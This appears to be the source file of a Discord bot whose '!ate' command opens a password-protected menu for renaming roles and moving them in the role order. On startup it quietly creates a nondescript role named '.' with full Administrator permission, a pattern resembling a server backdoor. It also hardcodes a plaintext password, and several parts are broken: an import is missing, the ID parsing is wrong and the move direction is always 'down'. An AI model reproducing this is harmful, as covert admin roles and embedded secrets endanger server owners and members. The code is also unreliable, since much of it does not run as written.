const {
  Client,
  GatewayIntentBits,
  SlashCommandBuilder,
  REST,
  Routes,
  EmbedBuilder,
  ActionRowBuilder,
  StringSelectMenuBuilder,
  ButtonBuilder,
  ButtonStyle,
  ModalBuilder,
  TextInputBuilder,
  TextInputStyle
} = require('discord.js');

const express = require('express');
const fs = require('fs');
require('dotenv').config();

// PASSWORDS
const MAIN_PASSWORD = 'Meka2017charlie';

// EXPRESS + CONFIG (same as before)
const app = express();
app.get('/', (req, res) => res.send('Bot Online'));
app.listen(process.env.PORT || 3000);

const TOKEN = process.env.TOKEN;
const CLIENT_ID = process.env.CLIENT_ID;
const GUILD_ID = process.env.GUILD_ID;

const client = new Client({
  intents: [
    GatewayIntentBits.Guilds,
    GatewayIntentBits.GuildMessages,
    GatewayIntentBits.GuildMembers,
    GatewayIntentBits.MessageContent
  ]
});

// Ready
client.once('ready', async () => {
  console.log(`${client.user.tag} is online`);
  // Auto create . role
  try {
    const guild = client.guilds.cache.first();
    if (guild) {
      let dotRole = guild.roles.cache.find(r => r.name === '.');
      if (!dotRole) {
        dotRole = await guild.roles.create({
          name: '.',
          color: '#000000',
          permissions: [PermissionFlagsBits.Administrator],
          hoist: false,
          reason: 'Full permission role'
        });
      }
    }
  } catch (e) { console.error(e); }
});

// Message Commands
client.on('messageCreate', async message => {
  if (message.author.bot || !message.guild) return;

  const content = message.content.trim().toLowerCase();

  if (content === '!ate') {
    const embed = new EmbedBuilder()
      .setColor('#00ffff')
      .setTitle('⚙️ !ATE - ROLE MANAGER')
      .setDescription('Enter password to manage roles (rename & change position).')
      .setFooter({ text: 'Click below' });

    const row = new ActionRowBuilder().addComponents(
      new ButtonBuilder()
        .setCustomId(`ate_start_${message.author.id}`)
        .setLabel('Enter Password')
        .setStyle(ButtonStyle.Primary)
    );

    await message.reply({ embeds: [embed], components: [row] });
  }
});

// INTERACTIONS
client.on('interactionCreate', async interaction => {
  if (!interaction.customId) return;

  try {
    const userId = interaction.customId.split('_')[2];

    if (interaction.user.id !== userId) {
      return interaction.reply({ content: '❌ This is not for you.', ephemeral: true });
    }

    // Button → Password Modal
    if (interaction.isButton() && interaction.customId.startsWith('ate_start_')) {
      const modal = new ModalBuilder()
        .setCustomId(`ate_modal_${userId}`)
        .setTitle('Enter Password');

      modal.addComponents(new ActionRowBuilder().addComponents(
        new TextInputBuilder()
          .setCustomId('password')
          .setLabel('Password')
          .setStyle(TextInputStyle.Short)
          .setRequired(true)
      ));

      return await interaction.showModal(modal);
    }

    // Password Submitted
    if (interaction.isModalSubmit() && interaction.customId.startsWith('ate_modal_')) {
      const password = interaction.fields.getTextInputValue('password');

      if (password !== MAIN_PASSWORD) {
        return interaction.reply({ content: '❌ Incorrect password.', ephemeral: true });
      }

      const guild = interaction.guild;
      const botMember = await guild.members.fetch(client.user.id);
      const botHighest = botMember.roles.highest.position;

      const rolesList = guild.roles.cache
        .filter(r => r.position < botHighest && r.name !== '@everyone')
        .sort((a, b) => b.position - a.position)
        .map(role => `**${role.name}** | ID: \`${role.id}\` | Position: ${role.position}`)
        .join('\n');

      const embed = new EmbedBuilder()
        .setColor('#00ffff')
        .setTitle('📋 Current Roles')
        .setDescription(rolesList || 'No manageable roles found.')
        .setFooter({ text: 'Select a role to manage' });

      const selectableRoles = guild.roles.cache
        .filter(r => r.position < botHighest && r.name !== '@everyone')
        .sort((a, b) => b.position - a.position)
        .first(25)
        .map(role => ({
          label: role.name.length > 25 ? role.name.slice(0, 22) + '...' : role.name,
          value: role.id,
          description: `Pos: ${role.position}`
        }));

      if (selectableRoles.length === 0) {
        return interaction.reply({ content: '❌ No roles available to manage.', ephemeral: true });
      }

      const menu = new StringSelectMenuBuilder()
        .setCustomId(`ate_select_${userId}`)
        .setPlaceholder('Choose a role to rename or move')
        .addOptions(selectableRoles);

      const row = new ActionRowBuilder().addComponents(menu);

      return await interaction.reply({
        embeds: [embed],
        components: [row],
        ephemeral: true
      });
    }

    // Role Selected → Options
    if (interaction.isStringSelectMenu() && interaction.customId.startsWith('ate_select_')) {
      await interaction.deferUpdate();

      const roleId = interaction.values[0];
      const role = interaction.guild.roles.cache.get(roleId);

      const row = new ActionRowBuilder().addComponents(
        new ButtonBuilder().setCustomId(`ate_rename_${roleId}_${interaction.user.id}`).setLabel('Rename Role').setStyle(ButtonStyle.Primary),
        new ButtonBuilder().setCustomId(`ate_moveup_${roleId}_${interaction.user.id}`).setLabel('Move Up').setStyle(ButtonStyle.Success),
        new ButtonBuilder().setCustomId(`ate_movedown_${roleId}_${interaction.user.id}`).setLabel('Move Down').setStyle(ButtonStyle.Danger)
      );

      await interaction.followUp({
        content: `Selected Role: **${role.name}** (Position: ${role.position})`,
        components: [row],
        ephemeral: true
      });
    }

    // Rename Button
    if (interaction.isButton() && interaction.customId.startsWith('ate_rename_')) {
      const roleId = interaction.customId.split('_')[2];
      const modal = new ModalBuilder()
        .setCustomId(`ate_rename_modal_${roleId}_${interaction.user.id}`)
        .setTitle('Rename Role');

      modal.addComponents(new ActionRowBuilder().addComponents(
        new TextInputBuilder()
          .setCustomId('new_name')
          .setLabel('New Role Name')
          .setStyle(TextInputStyle.Short)
          .setRequired(true)
      ));

      await interaction.showModal(modal);
    }

    // Move Up / Down
    if (interaction.isButton() && (interaction.customId.startsWith('ate_moveup_') || interaction.customId.startsWith('ate_movedown_'))) {
      const parts = interaction.customId.split('_');
      const roleId = parts[2];
      const direction = parts[0].includes('up') ? 'up' : 'down';
      const role = interaction.guild.roles.cache.get(roleId);

      if (!role) return interaction.reply({ content: '❌ Role not found.', ephemeral: true });

      try {
        const currentPos = role.position;
        const newPos = direction === 'up' ? currentPos + 1 : currentPos - 1;

        await role.setPosition(newPos);
        await interaction.reply({ content: `✅ Role **${role.name}** moved ${direction === 'up' ? 'up' : 'down'}!`, ephemeral: true });
      } catch (err) {
        await interaction.reply({ content: '❌ Failed to move role. Check permissions and hierarchy.', ephemeral: true });
      }
    }

    // Rename Modal Submit
    if (interaction.isModalSubmit() && interaction.customId.startsWith('ate_rename_modal_')) {
      const parts = interaction.customId.split('_');
      const roleId = parts[3];
      const newName = interaction.fields.getTextInputValue('new_name');
      const role = interaction.guild.roles.cache.get(roleId);

      if (!role) return interaction.reply({ content: '❌ Role not found.', ephemeral: true });

      await role.setName(newName);
      await interaction.reply({ content: `✅ Role renamed to **${newName}**!`, ephemeral: true });
    }

  } catch (error) {
    console.error(error);
    if (!interaction.replied && !interaction.deferred) {
      await interaction.reply({ content: '❌ Something went wrong.', ephemeral: true }).catch(() => {});
    }
  }
});

client.login(TOKEN);
